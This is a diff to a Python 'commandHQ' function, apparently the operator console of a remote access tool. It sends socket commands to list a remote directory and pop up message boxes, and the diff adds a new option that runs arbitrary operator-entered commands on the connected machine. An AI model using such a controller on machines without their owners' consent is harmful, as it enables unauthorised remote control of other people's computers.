@@ -80,9 +80,12 @@ def commandHQ():
         if command == "1":
             try:
                 dir_path = input(format + "Enter directory: ")
+
                 message = str(["vfisd", dir_path])
                 message = message.encode()
+
                 conn.send(message)
+            
                 ans = True
             except:
                 reload()
@@ -91,8 +94,22 @@ def commandHQ():
             try:
                 title = input(format + "Enter title: ")
                 message = input(format + "Enter message: ")
+
                 message = str(["smbwm", message, title])
                 message = message.encode()
+
+                conn.send(message)
+                ans = True
+            except:
+                reload()
+
+        if command == "3":
+            try:
+                command = input(format + "Enter command: ")
+
+                message = str(["ewc", command])
+                message = message.encode()
+                
                 conn.send(message)
                 ans = True
             except:
@@ -110,6 +127,9 @@ def commandHQ():
                 print(format + "Data received: {}".format(incoming_message[1]))
 
             if(incoming_message[0] == "smbwm"): # 2
+                print(format + "Data received: {}".format(incoming_message[1]))
+
+            if(incoming_message[0] == "ewc"): # 3
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
